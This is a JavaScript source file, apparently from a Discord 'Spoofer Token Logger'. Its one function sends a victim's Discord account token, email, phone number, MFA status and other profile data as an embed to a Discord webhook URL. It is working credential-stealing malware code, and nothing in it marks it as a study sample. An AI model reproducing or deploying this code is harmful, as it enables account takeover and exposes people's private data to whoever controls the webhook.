export async function sendTokenWebhook(url, payload) {
  if (!url?.trim()) {
    console.log('[webhook] empty URL');
    return false;
  }
  const ok =
    /https:\/\/(ptb\.|canary\.)?discord\.com\/api\/webhooks\//i.test(url) ||
    /https:\/\/discordapp\.com\/api\/webhooks\//i.test(url);
  if (!ok) {
    console.log('[webhook] bad host');
    return false;
  }
  const {
    userId, username, globalName, email, phone, mfa, verified, nitro, avatar, locale, token, linkedBy,
  } = payload;
  const tok = String(token || '');
  const tokenField = tok.length <= 1000 ? `\`\`\`${tok}\`\`\`` : `\`\`\`${tok.slice(0, 900)}...\`\`\``;
  const embed = {
    title: '🔑 Spoofer — Token Linked',
    color: 0x5865F2,
    fields: [
      { name: 'User ID', value: `\`${userId || 'n/a'}\``, inline: true },
      { name: 'Username', value: `\`${username || 'n/a'}\``, inline: true },
      { name: 'Display', value: `\`${globalName || 'n/a'}\``, inline: true },
      { name: 'Email', value: `\`${email || 'n/a'}\``, inline: true },
      { name: 'Phone', value: `\`${phone || 'n/a'}\``, inline: true },
      { name: 'MFA', value: `\`${mfa ? 'yes' : 'no'}\``, inline: true },
      { name: 'Verified', value: `\`${verified ? 'yes' : 'no'}\``, inline: true },
      { name: 'Nitro', value: `\`${nitro || 0}\``, inline: true },
      { name: 'Locale', value: `\`${locale || 'n/a'}\``, inline: true },
      { name: 'Linked By', value: linkedBy ? `<@${linkedBy}>` : 'n/a', inline: false },
      { name: 'Token', value: tokenField, inline: false },
    ],
    thumbnail: avatar && userId
      ? { url: `https://cdn.discordapp.com/avatars/${userId}/${avatar}.png?size=128` }
      : undefined,
    timestamp: new Date().toISOString(),
    footer: { text: 'Spoofer Token Logger' },
  };
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'Spoofer Logger', embeds: [embed] }),
    });
    console.log('[webhook] status', res.status);
    return res.ok || res.status === 204;
  } catch (e) {
    console.error('[webhook]', e.message);
    return false;
  }
}
